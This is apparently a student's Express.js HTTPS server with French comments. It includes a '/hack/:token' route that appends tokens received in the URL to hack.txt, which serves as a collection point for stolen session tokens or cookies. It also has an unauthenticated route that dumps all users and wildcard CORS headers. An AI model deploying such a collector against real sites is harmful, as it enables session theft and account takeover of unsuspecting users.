const express = require('express')
const app = express()
const fs = require('fs')
const http = require('http')
const https = require('https')
var models = require('./models')
const router = require('./router')
var User = models.Users
var bodyParser = require("body-parser")
var cookieParser = require('cookie-parser')
const privateKey  = fs.readFileSync('localhost.key', 'utf8');
const certificate = fs.readFileSync('localhost.cert', 'utf8');

const options = {
  key: privateKey,
  cert: certificate,
  requestCert: false,
  rejectUnauthorized: false
};
var server = https.createServer(options, app).listen(8443);
app.use(function(req, res, next) {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
  next();
});

// les scripts et middlewares de cette page sont exécutés dans l'ordre
app.get('/', function (req, res) {
  User.findAll({
    attributes:{
      exclude:['password']
    },
    include:[models.Posts]
  }).then(function(users) {
    res.send(users) 
  });
})
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cookieParser())
app.use('/', router)
app.get('/hack/:token', function(req, res) {
  // pour lire les fichiers
  const fs = require('fs');
  // on récupère le token dans l'URL
  let token = req.params.token + '\r\n';
  // on écrit dans le fichier
  fs.appendFile('hack.txt', token, (err) => {
      // si erreur
      if (err) throw err;
      // success
      res.send('fichier enregistré')
  });
})

// app.listen(8443, function () {
//   console.log('Example app listening on port 3000!')
// })
